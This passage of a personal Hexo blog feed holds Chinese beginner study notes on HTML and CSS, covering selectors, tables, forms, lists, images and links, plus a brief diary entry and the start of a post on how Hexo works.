id="扩展知识点"><a href="#扩展知识点" class="headerlink" title="扩展知识点"></a>扩展知识点</h2><p>link和import之间的区别？<br>①差别1：本质的差别：link属于XHTML标签，而@import完全是CSS提供的一种方式。<br>②差别2：加载顺序的差别：link引用的CSS会同时被加载，而@import引用的CSS会等到页面全部被下载完再被加载。所以有时候浏览@import加载 CSS的页面时开始会没有样式（就是闪烁），网速慢的时候还挺明显。<br>③差别3：兼容性的差别：@import老的浏览器不支持，而link标签无此问题。<br>样式表优先级<br>原则:就近原则————!important（放在属性值后）&gt;行内&gt;内部&gt;外部           #注意感叹号</p><h3 id="标签选择器"><a href="#标签选择器" class="headerlink" title="标签选择器"></a>标签选择器</h3><p>1.class类选择器</p><pre><code>&lt;!DOCTYPE html&gt;&lt;html lang=&quot;en&quot;&gt;&lt;head&gt;    &lt;meta charset=&quot;UTF-8&quot;&gt;    &lt;meta http-equiv=&quot;X-UA-Compatible&quot; content=&quot;IE=edge&quot;&gt;    &lt;meta name=&quot;viewport&quot; content=&quot;width=device-width, initial-scale=1.0&quot;&gt;    &lt;title&gt;Document&lt;/title&gt;    &lt;style&gt;        .类名1&#123;background-color:blue;&#125;                              #就近原则，离开头最近的style为准        .类名2&#123;background-color:red;&#125;    &lt;/style&gt;&lt;/head&gt;&lt;body&gt;    &lt;div class=&quot;类名1 类名2&quot;&gt;222&lt;/div&gt;                              #空格可以放置多个类名&lt;/body&gt;&lt;/html&gt;</code></pre><p>2.id选择器</p><pre><code>&lt;!DOCTYPE html&gt;&lt;html lang=&quot;en&quot;&gt;&lt;head&gt;    &lt;meta charset=&quot;UTF-8&quot;&gt;    &lt;meta http-equiv=&quot;X-UA-Compatible&quot; content=&quot;IE=edge&quot;&gt;    &lt;meta name=&quot;viewport&quot; content=&quot;width=device-width, initial-scale=1.0&quot;&gt;    &lt;title&gt;Document&lt;/title&gt;    &lt;style&gt;        #box1&#123;background-color:yellow;&#125;        #box3&#123;background-color:blue;&#125;        #box2&#123;background-color:red;&#125;    &lt;/style&gt;&lt;/head&gt;&lt;body&gt;    &lt;div&gt;1111111111&lt;/div&gt;    &lt;div id=&quot;box1&quot;&gt;2222222222&lt;/div&gt;    &lt;div id=&quot;box2&quot;&gt;3333333333&lt;/div&gt;&lt;/body&gt;&lt;/html&gt;语法：#id名&#123;属性：属性值;&#125; A）使用id选择符时，应该为每个元素定义一个id属性 如：&lt;divid=&quot;box&quot;&gt;&lt;/div&gt; B）id选择符的语法格式是“#”加上自定义的id名 如：#box&#123;width:300px;height:300px;&#125; C）起名时要取英文名，不能用关键字：（所有的标记和属性都是关键字） 如：head标记 D）一个id名称只能对应文档中一个具体的元素对象,多个时就不显示样式。（唯一性）</code></pre><p>3.通配符选择器</p><pre><code>&lt;!DOCTYPE html&gt;&lt;html lang=&quot;en&quot;&gt;&lt;head&gt;    &lt;meta charset=&quot;UTF-8&quot;&gt;    &lt;meta http-equiv=&quot;X-UA-Compatible&quot; content=&quot;IE=edge&quot;&gt;    &lt;meta name=&quot;viewport&quot; content=&quot;width=device-width, initial-scale=1.0&quot;&gt;    &lt;title&gt;Document&lt;/title&gt;    &lt;style&gt;        *&#123;            margin:0;      #外边距为0            padding:0;     #内边距为0        &#125;    &lt;/style&gt;&lt;/head&gt;&lt;body&gt;    &lt;div&gt;1111111111&lt;/div&gt;    &lt;div id=&quot;box1&quot;&gt;2222222222&lt;/div&gt;    &lt;div id=&quot;box2&quot;&gt;3333333333&lt;/div&gt;&lt;/body&gt;&lt;/html&gt;语法：*&#123;属性:属性值;&#125; 说明：通配选择符的写法是“*”，其含义就是所有元素。 *&#123;margin:0;padding:0;&#125;代表清除所有元素的默认边距值和填充值</code></pre><p>4.群组与后代选择器</p><pre><code>    &lt;style&gt;        标签们或者class内的类名们&#123;background-color:yellow&#125;      #标签们之间要加逗号，而且类名前要加.    &lt;/style&gt;若之间不加逗号则是后代选择器，仅更改空格代表的后代#从右到左地选择</code></pre><p>5.伪类选择器</p><pre><code>&lt;!DOCTYPE html&gt;&lt;html lang=&quot;en&quot;&gt;&lt;head&gt;    &lt;meta charset=&quot;UTF-8&quot;&gt;    &lt;meta http-equiv=&quot;X-UA-Compatible&quot; content=&quot;IE=edge&quot;&gt;    &lt;meta name=&quot;viewport&quot; content=&quot;width=device-width, initial-scale=1.0&quot;&gt;    &lt;title&gt;Document&lt;/title&gt;    &lt;style&gt;        a:link&#123;color:yellow;&#125;        a:visited&#123;color:red;&#125;        a:hover&#123;color:orange;&#125;        a:active&#123;color:blue;&#125;    &lt;/style&gt;&lt;/head&gt;&lt;body&gt;    &lt;a herf=&quot;超链接&quot;&gt;        内容    &lt;/a&gt;&lt;/body&gt;&lt;/html&gt;语法： a：link&#123;属性：属性值;&#125;超链接的初始状态 a.visited(属性：属性值;&#125;超链接被访问后的状态 a:hovert&#123;属性：属性值;&#125;鼠标悬停的状态 a:active&#123;属性：属性值;&#125;超链接被激活时的状态说明： A）顺序为： a:link,a:visited,a:hover,a:active,错误的顺序有时会使超链接的样式失效 B）为了简化代码，可以把伪类选择符中相同的声明提出来放在a选择符中； 例如：a&#123;color:red;&#125;a:hover&#123;color:green;&#125;表示超链接的初始和访问过后的状态一样，鼠标划过的状态和点击时的状态一样。</code></pre><p>6.选择器的权重<br>!important&gt;内联样式&gt;包含选择符&gt;id选择器&gt;class选择器&gt;类型（元素）选择器<br>有冲突时高权重覆盖低权重<br>相同权重就近原则（哪个先被定义）</p><h5 id="每日一句"><a href="#每日一句" class="headerlink" title="每日一句"></a>每日一句</h5><p>渔夫出海前，并不知道鱼在哪里。可他们还是选择了出发，因为他们相信，自己一定会满载而归。人生很多时候，是因为选择了才有机会，相信了才有可能。————稻盛和夫</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h5 id=&quot;每日一记&quot;&gt;&lt;a href=&quot;#每日一记&quot; class=&quot;headerlink&quot; title=&quot;每日一记&quot;&gt;&lt;/a&gt;每日一记&lt;/h5&gt;&lt;h3 id=&quot;CSS&quot;&gt;&lt;a href=&quot;#CSS&quot; class=&quot;headerlink&quot; title=&quot;CSS&quot;&gt;&lt;/a&gt;CS</summary>
      
    
    
    
    <category term="日报" scheme="https://liu1272.github.io/categories/%E6%97%A5%E6%8A%A5/"/>
    
    
    <category term="日报" scheme="https://liu1272.github.io/tags/%E6%97%A5%E6%8A%A5/"/>
    
  </entry>
  
  <entry>
    <title>20221007</title>
    <link href="https://liu1272.github.io/2022/10/07/b-3/"/>
    <id>https://liu1272.github.io/2022/10/07/b-3/</id>
    <published>2022-10-07T15:32:04.000Z</published>
    <updated>2022-10-07T17:10:19.400Z</updated>
    
    <content type="html"><![CDATA[<h5 id="每日一记"><a href="#每日一记" class="headerlink" title="每日一记"></a>每日一记</h5><h3 id="表格"><a href="#表格" class="headerlink" title="表格"></a>表格</h3><pre><code>&lt;!DOCTYPE html&gt;&lt;html lang=&quot;en&quot;&gt;&lt;head&gt;    &lt;meta charset=&quot;UTF-8&quot;&gt;    &lt;meta http-equiv=&quot;X-UA-Compatible&quot; content=&quot;IE=edge&quot;&gt;    &lt;meta name=&quot;viewport&quot; content=&quot;width=device-width, initial-scale=1.0&quot;&gt;    &lt;title&gt;Document&lt;/title&gt;&lt;/head&gt;&lt;body&gt;    &lt;table border=&quot;1&quot; width=&quot;500px&quot;               &lt;!-- 创建表格 --&gt;    align=&quot;center&quot;    bordercolor=&quot;red&quot;    bgcolor=&quot;yellow&quot;    cellspacing=&quot;20&quot;    cellpadding=&quot;100&quot;&gt;                            &lt;!-- 可以选择换不换行，但是&gt;要放在最后 --&gt;        &lt;tr&gt;                                      &lt;!-- tr是行 --&gt;            &lt;td&gt;内容&lt;/td&gt;                         &lt;!-- td是单元格 --&gt;        &lt;/tr&gt;        &lt;tr bgcolor=&quot;orange&quot; height=&quot;100&quot; align=&quot;center&quot; valign=&quot;bottom&quot;&gt;            &lt;td bgcolor=&quot;red&quot; align=&quot;right&quot; valign=&quot;top&quot;&gt;内容&lt;/td&gt;        &lt;/tr&gt;    &lt;/table&gt;&lt;/body&gt;&lt;/html&gt;表格table属性 1. 宽度 width            （可以写成百分比————父元素的百分比）2. 高度 height           （只能写像素px）3. 边框 border 4. 边框颜色 bordercolor 5. 背景颜色 bgcolor 6. 水平对齐 align=&quot;left&quot;或right或center 7. cellspacing=&quot;单元格与单元格之间的间距 8. cellpadding=&quot;单元格与内容之间的空隙行tr属性 1. 高度 height 2. 背景颜色 色bgcolor 3. 文字水平对齐 align=“left或right或center” 4. 文字垂直对齐 子valign=“top或middle或bottom&quot;单元格td属性（table data）1. 宽度 width （影响一列）2. 高度 height （影响一行）3. 背景颜色 bgcolor 4. 文字水平对齐 align=“left或right或center” 5. 文字垂直对齐 valign=“top或middle或bottom表格合并colspan=&quot;要合并的列数&quot;rowspan=&quot;要合并的行数&quot;注意不能合并成T型，合并之后要把被占的元素删除（注释掉）</code></pre><h3 id="表单"><a href="#表单" class="headerlink" title="表单"></a>表单</h3><pre><code>&lt;body&gt;    &lt;form action=&quot;地址&quot; method=&quot;POST&quot;&gt;                                                     &lt;!-- POST是不显示在url的，GET会暴露 --&gt;        内容：&lt;input type=&quot;text&quot; placeholder=&quot;提示信息，输入内容后会消失&quot; name=&quot;内容&quot;&gt;        &lt;!-- 输入的完全显示 --&gt;        内容：&lt;input type=&quot;password&quot; placeholder=&quot;提示信息，输入内容后会消失&quot; name=&quot;内容&quot;&gt;    &lt;!-- 输入的显示为一个点 --&gt;        &lt;input type=&quot;submit&quot; value=&quot;按钮上的内容&quot; &gt;                                         &lt;!-- 提交信息到action指定的地址 --&gt;           &lt;input type=&quot;reset&quot; value=&quot;按钮上的内容&quot; &gt;                                          &lt;!-- 清除全部表单内容 --&gt;        &lt;input type=&quot;button&quot; value=&quot;按钮上的内容&quot; &gt;                                         &lt;!-- 自定义按钮 --&gt;    &lt;/form&gt;&lt;/body&gt;***不设置name就不能发送***typr=&quot;submit&quot;相当于&lt;button&gt;内容&lt;/button&gt;Form当中method的post和get的区别？ 1.get是从服务器上获取数据，post是向服务器传送数据。 2.get是把参数数据队列加到提交表单的ACTION属性所指的URL中，值和表单内各个字段——对应，在URL中可以看到。  post 是通过HTTPpost机制，将表单内各个字段与其内容放置在HTMLHEADER内一起传送到ACTION属性所指的URL地址。用户看不到这个过程。 3.对于get方式，服务器端用Request.QueryString获取变量的值，对于post方式，服务器端用Request.Form获取提交的数据。 4.get传送的数据量较小。post传送的数据量较大，一般为不受限制。</code></pre><h5 id="每日一句"><a href="#每日一句" class="headerlink" title="每日一句"></a>每日一句</h5><p>生活，在喜怒哀乐间走走停停 不知道会遇见什么，只知道阳光这么好，别辜负了今天，早安！</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h5 id=&quot;每日一记&quot;&gt;&lt;a href=&quot;#每日一记&quot; class=&quot;headerlink&quot; title=&quot;每日一记&quot;&gt;&lt;/a&gt;每日一记&lt;/h5&gt;&lt;h3 id=&quot;表格&quot;&gt;&lt;a href=&quot;#表格&quot; class=&quot;headerlink&quot; title=&quot;表格&quot;&gt;&lt;/a&gt;表格&lt;/h</summary>
      
    
    
    
    <category term="日报" scheme="https://liu1272.github.io/categories/%E6%97%A5%E6%8A%A5/"/>
    
    
    <category term="日报" scheme="https://liu1272.github.io/tags/%E6%97%A5%E6%8A%A5/"/>
    
  </entry>
  
  <entry>
    <title>20221006</title>
    <link href="https://liu1272.github.io/2022/10/06/b-4/"/>
    <id>https://liu1272.github.io/2022/10/06/b-4/</id>
    <published>2022-10-06T15:32:04.000Z</published>
    <updated>2022-10-07T23:47:25.045Z</updated>
    
    <content type="html"><![CDATA[<h5 id="每日一记"><a href="#每日一记" class="headerlink" title="每日一记"></a>每日一记</h5><h3 id="1-什么是HTML"><a href="#1-什么是HTML" class="headerlink" title="1.什么是HTML"></a>1.什么是HTML</h3><p>是扩展名，超文本标记语言(Hyper Text Markup Language)<br>不是编程语言而是由标签组成的标记语言</p><h3 id="2-兼容性"><a href="#2-兼容性" class="headerlink" title="2.兼容性"></a>2.兼容性</h3><p>查询网站<br>不同浏览器兼容性不一样，因此需要Web标准的制定<br>W3C万维网联盟</p><h3 id="3-WEB组成部分"><a href="#3-WEB组成部分" class="headerlink" title="3.WEB组成部分"></a>3.WEB组成部分</h3><p>HTML:结构，由W3C制定标准和语法<br>CSS:样式布局<br>JS:触发行为</p><h3 id="4-HTML基本语法"><a href="#4-HTML基本语法" class="headerlink" title="4.HTML基本语法"></a>4.HTML基本语法</h3><p>(1)常规标记/双标记<br>&lt;标记 属性=”属性值”&gt;<br>&lt;/。。。&gt;<br>(2)空标记/单标记<br>&lt;标记 属性=”属性值”/&gt;</p><h3 id="5-基本结构"><a href="#5-基本结构" class="headerlink" title="5.基本结构"></a>5.基本结构</h3><pre><code>&lt;!DOCTYPE html 5&gt;                     #文档说明标签（格式说明使用html5）&lt;html lang=&quot;en&quot;&gt;                      #语言zh-CN/ja-jp/en（对网址翻译）&lt;head&gt;  &lt;meta charset=&quot;UTF-8&quot;&gt;              #编码ASCII/ISO-8859-1/GB2312/UTF-8  &lt;meta http-equiv=&quot;X-UA-Compatible&quot; content=&quot;IE=edge&quot;&gt;  &lt;meta name=&quot;viewport&quot; content=&quot;width=device-width, initial-scale=1.0&quot;&gt;  &lt;title&gt;Document&lt;/title&gt;&lt;/head&gt;&lt;body&gt;  &lt;/body&gt;&lt;/html&gt;</code></pre><h3 id="6-开发工具"><a href="#6-开发工具" class="headerlink" title="6.开发工具"></a>6.开发工具</h3><p>Sublime Text，webstorm,HBuilderX,VScode<br>快捷键:选中文本alt+w添加&lt; p &gt;<br>ctrl+/注释<br>ul&gt;li{内容}*n + 回车 建立n个无序列表并加上内容<br>dl&gt;dt{内容}+dd{内容} + 回车 建立自定义列表并加上内容</p><h3 id="7-基本标签"><a href="#7-基本标签" class="headerlink" title="7.基本标签"></a>7.基本标签</h3><pre><code>(1)标题标签    &lt;h1&gt;一级标题最大&lt;/h1&gt;    &lt;h6&gt;最小六级标题&lt;/h6&gt;(2)段落文本标签    &lt;p&gt;段落文本内容&lt;/p&gt;    段与段间有间隔(3)水平线标签(同时更改颜色，长度，位置，关闭阴影)                       #注意一对标签的格式加/    &lt;hr color=&quot;green&quot; width=&quot;600&quot; align=&quot;left/right&quot; noshade&gt;(4)文本修饰标签————加粗   &lt;b&gt;普通加粗&lt;strong&gt;便于爬虫(5)文本修饰标签————倾斜   &lt;em&gt;或&lt;i&gt;(6)文本修饰标签————删除   &lt;s&gt;或&lt;del&gt;(7)文本修饰标签————下划线   &lt;u&gt;(8)文本修饰标签————上下标   &lt;sub&gt;/&lt;sup&gt;(9)划分区域，占一行（破坏结构）   &lt;div&gt;内容&lt;/div&gt;(10)独立修饰文本（不破坏结构）   &lt;span&gt;内容&lt;/span&gt;</code></pre><h3 id="8-特殊符号"><a href="#8-特殊符号" class="headerlink" title="8.特殊符号"></a>8.特殊符号</h3><pre><code>尖角号      &amp;lt;左    &amp;gt;右空格        &amp;nbsp;受字体影响    &amp;emsp;一个中文宽度版权        &amp;copy;©商标        &amp;trade; TM标签      &amp;reg; R标签</code></pre><h3 id="9-列表"><a href="#9-列表" class="headerlink" title="9.列表"></a>9.列表</h3><pre><code>(1)有序&lt;!-- li里可以随意放标签，ol里只能放li，数字1.2.3.是自动生成的 --&gt;&lt;ol type=&quot;A&quot; start=&quot;&quot;4&gt;    &lt;li&gt;                             #type只能是1，a，A，i，I    &lt;/li&gt;                     start只能取一个数字1，2，3...&lt;/ol&gt;(2)无序&lt;!-- ul里只能放li，li里随便放 --&gt;&lt;ul type=&quot;none&quot;&gt;    &lt;li&gt;                             #默认是黑色实心圆    &lt;/li&gt;                     type只能填disc，circle，square，none（取消）&lt;/ul&gt;(3)自定义&lt;dl&gt;    &lt;dt&gt;文字或图&lt;/dt&gt;         #只复制&lt;dd&gt;&lt;dt&gt;是贴在一起的    &lt;dd&gt;相关文字&lt;/dd&gt;          复制&lt;dl&gt;则间隔一行&lt;/dl&gt;</code></pre><h3 id="10-图片"><a href="#10-图片" class="headerlink" title="10.图片"></a>10.图片</h3><h1 id="标签"><a href="#标签" class="headerlink" title="标签"></a>标签</h1><pre><code>&lt;img src=&quot;XXX&quot;&gt;(1)绝对路径（本地有此文件）    直接填地址(2)相对路径    与html文件在同级目录下写             名字.gif  或者  ./名字.gif    图片在下级则直接写地址    图片在上级则先../返回上一级再接着写地址(每一个../都是一次返回上级)#此处要注意：不同操作系统使用的斜杠不同（Linux系统是/  window系统都可以）# 属性&lt;img src=&quot;&quot; alt=&quot;&quot;&gt;(1)alt=（你告诉它要显示的）图片加载失败时的提示信息&quot;(2)title=标题（指针放上去后显示的）(3)width=&quot;200px&quot; height=&quot;200px&quot;更改宽高         #px是像数值，只设置一个时会自动缩放</code></pre><h3 id="11-超链接-a链接"><a href="#11-超链接-a链接" class="headerlink" title="11.超链接(a链接)"></a>11.超链接(a链接)</h3><pre><code>&lt;a herf=&quot;链接&quot; title=&quot;鼠标悬停显示的信息&quot; target=&quot;在何处打开文档&quot;&gt;超链接放置的内容&lt;/a&gt;  (1)target=&quot;_self&quot;      在默认值(2)target=&quot;_blank&quot;     在新窗口打开(3)超链接赋予图片:&lt;!DOCTYPE html&gt;&lt;html lang=&quot;en&quot;&gt;&lt;head&gt;    &lt;meta charset=&quot;UTF-8&quot;&gt;    &lt;meta http-equiv=&quot;X-UA-Compatible&quot; content=&quot;IE=edge&quot;&gt;    &lt;meta name=&quot;viewport&quot; content=&quot;width=device-width, initial-scale=1.0&quot;&gt;    &lt;title&gt;Document&lt;/title&gt;&lt;/head&gt;&lt;body&gt;    &lt;a herf=&quot;https://www.baidu.com&quot; title=&quot;百度查询&quot;&gt;        &lt;img src=&quot;图片地址&quot; alt=&quot;&quot;&gt;                          将图片包在超链接中    &lt;/a&gt;&lt;/body&gt;&lt;/html&gt;</code></pre><h5 id="每日一句"><a href="#每日一句" class="headerlink" title="每日一句"></a>每日一句</h5><p>只要你仍然担忧别人对你的看法，你就会受制于他们。唯有当你无须外界的认可时，你才能拥有你自己。————尼尔-唐纳德-沃尔什</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h5 id=&quot;每日一记&quot;&gt;&lt;a href=&quot;#每日一记&quot; class=&quot;headerlink&quot; title=&quot;每日一记&quot;&gt;&lt;/a&gt;每日一记&lt;/h5&gt;&lt;h3 id=&quot;1-什么是HTML&quot;&gt;&lt;a href=&quot;#1-什么是HTML&quot; class=&quot;headerlink&quot; title=</summary>
      
    
    
    
    <category term="hexo" scheme="https://liu1272.github.io/categories/hexo/"/>
    
    
    <category term="日报" scheme="https://liu1272.github.io/tags/%E6%97%A5%E6%8A%A5/"/>
    
  </entry>
  
  <entry>
    <title>20221006</title>
    <link href="https://liu1272.github.io/2022/10/06/b-5/"/>
    <id>https://liu1272.github.io/2022/10/06/b-5/</id>
    <published>2022-10-06T15:32:04.000Z</published>
    <updated>2022-10-08T16:33:18.115Z</updated>
    
    <content type="html"><![CDATA[<h5 id="每日一记"><a href="#每日一记" class="headerlink" title="每日一记"></a>每日一记</h5><h3 id="1-什么是HTML"><a href="#1-什么是HTML" class="headerlink" title="1.什么是HTML"></a>1.什么是HTML</h3><p>是扩展名，超文本标记语言(Hyper Text Markup Language)<br>不是编程语言而是由标签组成的标记语言</p><h3 id="2-兼容性"><a href="#2-兼容性" class="headerlink" title="2.兼容性"></a>2.兼容性</h3><p>查询网站<br>不同浏览器兼容性不一样，因此需要Web标准的制定<br>W3C万维网联盟</p><h3 id="3-WEB组成部分"><a href="#3-WEB组成部分" class="headerlink" title="3.WEB组成部分"></a>3.WEB组成部分</h3><p>HTML:结构，由W3C制定标准和语法<br>CSS:样式布局<br>JS:触发行为</p><h3 id="4-HTML基本语法"><a href="#4-HTML基本语法" class="headerlink" title="4.HTML基本语法"></a>4.HTML基本语法</h3><p>(1)常规标记/双标记<br>&lt;标记 属性=”属性值”&gt;<br>&lt;/。。。&gt;<br>(2)空标记/单标记<br>&lt;标记 属性=”属性值”/&gt;</p><h3 id="5-基本结构"><a href="#5-基本结构" class="headerlink" title="5.基本结构"></a>5.基本结构</h3><pre><code>&lt;!DOCTYPE html 5&gt;                     #文档说明标签（格式说明使用html5）&lt;html lang=&quot;en&quot;&gt;                      #语言zh-CN/ja-jp/en（对网址翻译）&lt;head&gt;  &lt;meta charset=&quot;UTF-8&quot;&gt;              #编码ASCII/ISO-8859-1/GB2312/UTF-8  &lt;meta http-equiv=&quot;X-UA-Compatible&quot; content=&quot;IE=edge&quot;&gt;  &lt;meta name=&quot;viewport&quot; content=&quot;width=device-width, initial-scale=1.0&quot;&gt;  &lt;title&gt;Document&lt;/title&gt;&lt;/head&gt;&lt;body&gt;  &lt;/body&gt;&lt;/html&gt;</code></pre><h3 id="6-开发工具"><a href="#6-开发工具" class="headerlink" title="6.开发工具"></a>6.开发工具</h3><p>Sublime Text，webstorm,HBuilderX,VScode<br>快捷键:选中文本alt+w添加&lt; p &gt;<br>ctrl+/注释<br>ul&gt;li{内容}*n + 回车 建立n个无序列表并加上内容<br>dl&gt;dt{内容}+dd{内容} + 回车 建立自定义列表并加上内容</p><h3 id="7-基本标签"><a href="#7-基本标签" class="headerlink" title="7.基本标签"></a>7.基本标签</h3><pre><code>(1)标题标签    &lt;h1&gt;一级标题最大&lt;/h1&gt;    &lt;h6&gt;最小六级标题&lt;/h6&gt;(2)段落文本标签    &lt;p&gt;段落文本内容&lt;/p&gt;    段与段间有间隔(3)水平线标签(同时更改颜色，长度，位置，关闭阴影)                       #注意一对标签的格式加/    &lt;hr color=&quot;green&quot; width=&quot;600&quot; align=&quot;left/right&quot; noshade&gt;(4)文本修饰标签————加粗   &lt;b&gt;普通加粗&lt;strong&gt;便于爬虫(5)文本修饰标签————倾斜   &lt;em&gt;或&lt;i&gt;(6)文本修饰标签————删除   &lt;s&gt;或&lt;del&gt;(7)文本修饰标签————下划线   &lt;u&gt;(8)文本修饰标签————上下标   &lt;sub&gt;/&lt;sup&gt;(9)划分区域，占一行（破坏结构）   &lt;div&gt;内容&lt;/div&gt;(10)独立修饰文本（不破坏结构）   &lt;span&gt;内容&lt;/span&gt;</code></pre><h3 id="8-特殊符号"><a href="#8-特殊符号" class="headerlink" title="8.特殊符号"></a>8.特殊符号</h3><pre><code>尖角号      &amp;lt;左    &amp;gt;右空格        &amp;nbsp;受字体影响    &amp;emsp;一个中文宽度版权        &amp;copy;©商标        &amp;trade; TM标签      &amp;reg; R标签</code></pre><h3 id="9-列表"><a href="#9-列表" class="headerlink" title="9.列表"></a>9.列表</h3><pre><code>(1)有序&lt;!-- li里可以随意放标签，ol里只能放li，数字1.2.3.是自动生成的 --&gt;&lt;ol type=&quot;A&quot; start=&quot;&quot;4&gt;    &lt;li&gt;                             #type只能是1，a，A，i，I    &lt;/li&gt;                     start只能取一个数字1，2，3...&lt;/ol&gt;(2)无序&lt;!-- ul里只能放li，li里随便放 --&gt;&lt;ul type=&quot;none&quot;&gt;    &lt;li&gt;                             #默认是黑色实心圆    &lt;/li&gt;                     type只能填disc，circle，square，none（取消）&lt;/ul&gt;(3)自定义&lt;dl&gt;    &lt;dt&gt;文字或图&lt;/dt&gt;         #只复制&lt;dd&gt;&lt;dt&gt;是贴在一起的    &lt;dd&gt;相关文字&lt;/dd&gt;          复制&lt;dl&gt;则间隔一行&lt;/dl&gt;</code></pre><h3 id="10-图片"><a href="#10-图片" class="headerlink" title="10.图片"></a>10.图片</h3><h1 id="标签"><a href="#标签" class="headerlink" title="标签"></a>标签</h1><pre><code>&lt;img src=&quot;XXX&quot;&gt;(1)绝对路径（本地有此文件）    直接填地址(2)相对路径    与html文件在同级目录下写             名字.gif  或者  ./名字.gif    图片在下级则直接写地址    图片在上级则先../返回上一级再接着写地址(每一个../都是一次返回上级)#此处要注意：不同操作系统使用的斜杠不同（Linux系统是/  window系统都可以）# 属性&lt;img src=&quot;&quot; alt=&quot;&quot;&gt;(1)alt=（你告诉它要显示的）图片加载失败时的提示信息&quot;(2)title=标题（指针放上去后显示的）(3)width=&quot;200px&quot; height=&quot;200px&quot;更改宽高         #px是像数值，只设置一个时会自动缩放</code></pre><h3 id="11-超链接-a链接"><a href="#11-超链接-a链接" class="headerlink" title="11.超链接(a链接)"></a>11.超链接(a链接)</h3><pre><code>&lt;a herf=&quot;链接&quot; title=&quot;鼠标悬停显示的信息&quot; target=&quot;在何处打开文档&quot;&gt;超链接放置的内容&lt;/a&gt;  (1)target=&quot;_self&quot;      在默认值(2)target=&quot;_blank&quot;     在新窗口打开(3)超链接赋予图片:&lt;!DOCTYPE html&gt;&lt;html lang=&quot;en&quot;&gt;&lt;head&gt;    &lt;meta charset=&quot;UTF-8&quot;&gt;    &lt;meta http-equiv=&quot;X-UA-Compatible&quot; content=&quot;IE=edge&quot;&gt;    &lt;meta name=&quot;viewport&quot; content=&quot;width=device-width, initial-scale=1.0&quot;&gt;    &lt;title&gt;Document&lt;/title&gt;&lt;/head&gt;&lt;body&gt;    &lt;a herf=&quot;https://www.baidu.com&quot; title=&quot;百度查询&quot;&gt;        &lt;img src=&quot;图片地址&quot; alt=&quot;&quot;&gt;                          将图片包在超链接中    &lt;/a&gt;&lt;/body&gt;&lt;/html&gt;</code></pre><h5 id="每日一句"><a href="#每日一句" class="headerlink" title="每日一句"></a>每日一句</h5><p>只要你仍然担忧别人对你的看法，你就会受制于他们。唯有当你无须外界的认可时，你才能拥有你自己。————尼尔-唐纳德-沃尔什</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h5 id=&quot;每日一记&quot;&gt;&lt;a href=&quot;#每日一记&quot; class=&quot;headerlink&quot; title=&quot;每日一记&quot;&gt;&lt;/a&gt;每日一记&lt;/h5&gt;&lt;h3 id=&quot;1-什么是HTML&quot;&gt;&lt;a href=&quot;#1-什么是HTML&quot; class=&quot;headerlink&quot; title=</summary>
      
    
    
    
    <category term="hexo" scheme="https://liu1272.github.io/categories/hexo/"/>
    
    
    <category term="日报" scheme="https://liu1272.github.io/tags/%E6%97%A5%E6%8A%A5/"/>
    
  </entry>
  
  <entry>
    <title>20221005</title>
    <link href="https://liu1272.github.io/2022/10/05/b-2/"/>
    <id>https://liu1272.github.io/2022/10/05/b-2/</id>
    <published>2022-10-05T13:41:04.000Z</published>
    <updated>2022-10-05T13:50:06.496Z</updated>
    
    <content type="html"><![CDATA[<h3 id="每日一记"><a href="#每日一记" class="headerlink" title="每日一记"></a>每日一记</h3><p>1.今天给blog整了个大装修<br>2.除此之外好像啥也没干</p><h3 id="每日一悟"><a href="#每日一悟" class="headerlink" title="每日一悟"></a>每日一悟</h3><p>在装修过程中发现了修改和添加模块基本上就是更改source和themes两个文件夹<br>原因在上一篇文章中已经给出了详细说明。</p><h3 id="每日一句"><a href="#每日一句" class="headerlink" title="每日一句"></a>每日一句</h3><p>无论在何种困顿中，唯有内心的自由馈赠我们真正的未来。</p><h3 id="今天就这样吧"><a href="#今天就这样吧" class="headerlink" title="今天就这样吧"></a>今天就这样吧</h3>]]></content>
    
    
      
      
    <summary type="html">&lt;h3 id=&quot;每日一记&quot;&gt;&lt;a href=&quot;#每日一记&quot; class=&quot;headerlink&quot; title=&quot;每日一记&quot;&gt;&lt;/a&gt;每日一记&lt;/h3&gt;&lt;p&gt;1.今天给blog整了个大装修&lt;br&gt;2.除此之外好像啥也没干&lt;/p&gt;
&lt;h3 id=&quot;每日一悟&quot;&gt;&lt;a href=&quot;#每日</summary>
      
    
    
    
    <category term="日报" scheme="https://liu1272.github.io/categories/%E6%97%A5%E6%8A%A5/"/>
    
    
    <category term="日报" scheme="https://liu1272.github.io/tags/%E6%97%A5%E6%8A%A5/"/>
    
  </entry>
  
  <entry>
    <title></title>
    <link href="https://liu1272.github.io/2022/10/05/b-1/"/>
    <id>https://liu1272.github.io/2022/10/05/b-1/</id>
    <published>2022-10-04T16:57:04.000Z</published>
    <updated>2022-10-04T17:29:30.905Z</updated>
    
    <content type="html"><![CDATA[<h5 id="深入了解Hexo搭建博客的底层原理"><a href="#深入了解Hexo搭建博客的底层原理" class="headerlink" title="深入了解Hexo搭建博客的底层原理"></a>深入了解Hexo搭建博客的底层原理</h5><h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>在趟过无数个坑，解决了无数个报错后，终于把这个博客整出来了。<br>现在回过头来，开始对hexo原理好奇起来。</p><h3 id="优缺点"><a href="#优缺点" class="headerlink" title="优缺点"></a>优缺点</h3><p>优点很明显啊，主题多，文件多(利于解决各种各样天花乱坠的报错)，通过修改yaml配置文件来修改样式比较简单。<br>但是缺点一样很明显，bug是真的多(一步错步步错)，每次发布文章都需要重新部署，没有一个后台管理系统(加上GitHub的海外服务器，简直让人欲仙欲死)。</p><h3 id="基本原理"><a href="#基本原理" class="headerlink" title="基本原理"></a>基本原理</h3><p>博客hexo生成的是静态页面，而Github pages 又支持静态页面的解析。因此二者一拍即合能够用来生成 html 拼合成博客。</p><h3 id="Hexo"><a href="#Hexo" class="headerlink" title="Hexo"></a>Hexo</h3><p>1.Hexo 使用 Markdown（或其他渲染引擎）解析文章，在几秒内，即可利用靓丽的主题生成静态网页。<br>2.文件<br>  ├── node_modules：             #依赖包-安装插件及所需nodejs模块。<br>  ├── public                     #最终网页信息。即存放被解析markdown、html文件。<br>  ├── scaffolds                  #模板文件夹。即当您新建文章时，根据 scaffold生成文件。<br>  ├── source                     #资源文件夹。即存放用户资源。<br>  └── _posts                     #博客文章目录。<br>  └── themes                     #存放主题。Hexo根据主题生成静态页面。<br>  ├── _config.yml                #网站的配置信息。标题、网站名称等。<br>  ├── db.json：                  #source解析所得到的缓存文件。<br>  ├── package.json               # 